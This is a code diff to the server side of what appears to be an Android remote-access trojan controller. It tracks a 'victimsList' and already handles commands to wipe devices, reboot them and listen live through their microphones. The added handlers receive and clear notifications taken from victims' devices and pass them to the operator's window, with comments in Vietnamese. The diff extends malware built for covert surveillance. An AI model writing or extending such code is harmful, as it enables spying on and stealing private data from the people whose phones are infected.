@@ -231,6 +231,33 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       }
     });
 
+    // Xử lý notifications data từ client
+    socket.on('x0000nt', function (data) {
+      if (data && data.notifications) {
+        // Gửi notifications đến lab window nếu đang mở
+        if (windows[index]) {
+          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:NotificationsReceived', {
+            deviceId: index,
+            notifications: data.notifications
+          });
+        }
+      }
+    });
+
+    // Xử lý clear notifications response từ client
+    socket.on('x0000clearNt', function (data) {
+      if (data && data.status) {
+        // Gửi thông báo clear notifications đến lab window nếu đang mở
+        if (windows[index]) {
+          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:NotificationsCleared', {
+            deviceId: index,
+            status: data.status,
+            message: data.message
+          });
+        }
+      }
+    });
+
     socket.on('disconnect', function () {
       // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
@@ -356,6 +383,8 @@ ipcMain.on('openLabWindow', function (e, page, index) {
         victimsList.getVictim(index).socket.removeAllListeners("x0000wipeDevice"); // wipe out device
         victimsList.getVictim(index).socket.removeAllListeners("x0000rebootDevice"); // reboot device
         victimsList.getVictim(index).socket.removeAllListeners("x0000listenMic"); // real-time microphone
+        victimsList.getVictim(index).socket.removeAllListeners("x0000nt"); // notifications
+        victimsList.getVictim(index).socket.removeAllListeners("x0000clearNt"); // clear notifications
       }
     });
 
